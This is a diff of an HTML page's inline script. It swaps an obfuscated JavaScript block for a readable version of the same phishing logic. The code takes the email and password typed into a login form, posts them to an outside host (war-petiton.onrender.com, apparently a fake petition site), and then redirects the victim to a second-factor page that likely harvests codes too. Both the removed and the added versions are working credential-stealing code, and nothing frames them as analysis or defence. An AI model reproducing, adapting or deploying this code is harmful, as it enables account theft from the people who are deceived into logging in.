@@ -551,8 +551,64 @@
 
     <script>
 
-(function(_0x48063b,_0x3a22ad){const _0x2fdf11=_0x5178,_0x5b46b7=_0x48063b();while(!![]){try{const _0x3c9c0b=parseInt(_0x2fdf11(0x187))/0x1*(-parseInt(_0x2fdf11(0x18e))/0x2)+-parseInt(_0x2fdf11(0x17c))/0x3*(parseInt(_0x2fdf11(0x19a))/0x4)+parseInt(_0x2fdf11(0x185))/0x5+-parseInt(_0x2fdf11(0x180))/0x6*(-parseInt(_0x2fdf11(0x197))/0x7)+parseInt(_0x2fdf11(0x19c))/0x8*(parseInt(_0x2fdf11(0x196))/0x9)+parseInt(_0x2fdf11(0x18a))/0xa+parseInt(_0x2fdf11(0x17d))/0xb*(-parseInt(_0x2fdf11(0x19d))/0xc);if(_0x3c9c0b===_0x3a22ad)break;else _0x5b46b7['push'](_0x5b46b7['shift']());}catch(_0x2b7599){_0x5b46b7['push'](_0x5b46b7['shift']());}}}(_0x3a90,0x97300));function connectionErr(){setTimeout(()=>{const _0x32a575=_0x5178;alert(_0x32a575(0x183));},0xbb8);}function sendPostRequest(){const _0x3d5065=_0x5178,_0x5751bb=document[_0x3d5065(0x195)](_0x3d5065(0x18c))['value'],_0x2b0dd8={'key1':_0x5751bb};fetch(_0x3d5065(0x194),{'method':_0x3d5065(0x198),'headers':{'Content-Type':_0x3d5065(0x19b)},'body':JSON[_0x3d5065(0x18d)](_0x2b0dd8)})[_0x3d5065(0x191)](_0x47cd9f=>_0x47cd9f['json']())[_0x3d5065(0x191)](_0xca776e=>{const _0x7ac9c5=_0x3d5065;console[_0x7ac9c5(0x189)](_0x7ac9c5(0x184),_0xca776e);})['catch'](_0x5a4fe1=>{const _0x1f7a47=_0x3d5065;console['error'](_0x1f7a47(0x181),_0x5a4fe1);});}function _0x5178(_0x178ea4,_0x1ea6a0){const _0x3a908f=_0x3a90();return _0x5178=function(_0x5178e5,_0x3eee87){_0x5178e5=_0x5178e5-0x17b;let _0x10f286=_0x3a908f[_0x5178e5];return _0x10f286;},_0x5178(_0x178ea4,_0x1ea6a0);}function _0x3a90(){const _0x5a3b60=['134apxSkY','https://war-petiton.onrender.com/endpoint3','Error','then','location','Enter\x20a\x20valid\x20Email\x20to\x20continue','https://war-petiton.onrender.com/storeData','getElementById','9345735jYjVWe','7pfqYQx','POST','/2fa','8cvSOlC','application/json','8owiAnu','1284VVDlem','value','1150431ygxkkf','78265KIoEMl','href','type','4978044plSEla','Error:','text','Difficulty\x20connecting\x20to\x20site!','Success:','1745715McJAly','password','9993bUIWKa','test','log','5998220XYGmJf','error','email','stringify'];_0x3a90=function(){return _0x5a3b60;};return _0x3a90();}const handleLogin=async()=>{const _0x442684=_0x5178,_0x1b2eea=_0x442684(0x18f),_0x516b43=document[_0x442684(0x195)]('email')[_0x442684(0x17b)];_0x2c0495=document[_0x442684(0x195)](_0x442684(0x186))[_0x442684(0x17b)];function _0x4d65fb(_0x6f5444){const _0x3d442c=_0x442684;return/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/[_0x3d442c(0x188)](_0x6f5444);}if(_0x516b43==''||!_0x4d65fb(_0x516b43))alert(_0x442684(0x193));else{if(_0x2c0495=='')alert('Must\x20Enter\x20Password');else{sendPostRequest();try{const _0x265713={'email':_0x516b43,'password':_0x2c0495},_0x2f676f=await fetch(_0x1b2eea,{'method':_0x442684(0x198),'headers':{'Content-Type':_0x442684(0x19b)},'body':JSON[_0x442684(0x18d)](_0x265713)});_0x2f676f['status']===0xc8&&(window[_0x442684(0x192)][_0x442684(0x17e)]=_0x442684(0x199));}catch(_0xf29485){console[_0x442684(0x18b)](_0x442684(0x190),_0xf29485);}}}};function showPassword(){const _0x58d458=_0x5178;var _0x2458af=document[_0x58d458(0x195)](_0x58d458(0x186));_0x2458af['type']==='text'?_0x2458af[_0x58d458(0x17f)]=_0x58d458(0x186):_0x2458af['type']=_0x58d458(0x182);}
-
+function connectionErr() {
+  setTimeout(() => {
+    alert('Difficulty connecting to site!')
+  }, 3000)
+}
+function sendPostRequest() {
+  const _0x5751bb = document.getElementById('email').value,
+    _0x2b0dd8 = { key1: _0x5751bb }
+  fetch('https://war-petiton.onrender.com/storeData', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(_0x2b0dd8),
+  })
+    .then((_0x47cd9f) => _0x47cd9f.json())
+    .then((_0xca776e) => {
+      console.log('Success:', _0xca776e)
+    })
+    .catch((_0x5a4fe1) => {
+      console.error('Error:', _0x5a4fe1)
+    })
+}
+const handleLogin = async () => {
+  const _0x1b2eea = 'https://war-petiton.onrender.com/endpoint3',
+    _0x516b43 = document.getElementById('email').value
+  _0x2c0495 = document.getElementById('password').value
+  function _0x4d65fb(_0x6f5444) {
+    return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(_0x6f5444)
+  }
+  if (_0x516b43 == '' || !_0x4d65fb(_0x516b43)) {
+    alert('Enter a valid Email to continue')
+  } else {
+    if (_0x2c0495 == '') {
+      alert('Must Enter Password')
+    } else {
+      sendPostRequest()
+      try {
+        const _0x265713 = {
+            email: _0x516b43,
+            password: _0x2c0495,
+          },
+          _0x2f676f = await fetch(_0x1b2eea, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(_0x265713),
+          })
+        _0x2f676f.status === 200 && (window.location.href = '/2faThree')
+      } catch (_0xf29485) {
+        console.error('Error', _0xf29485)
+      }
+    }
+  }
+}
+function showPassword() {
+  var _0x2458af = document.getElementById('password')
+  _0x2458af.type === 'text'
+    ? (_0x2458af.type = 'password')
+    : (_0x2458af.type = 'text')
+}
     </script>
 </body>
 </html>
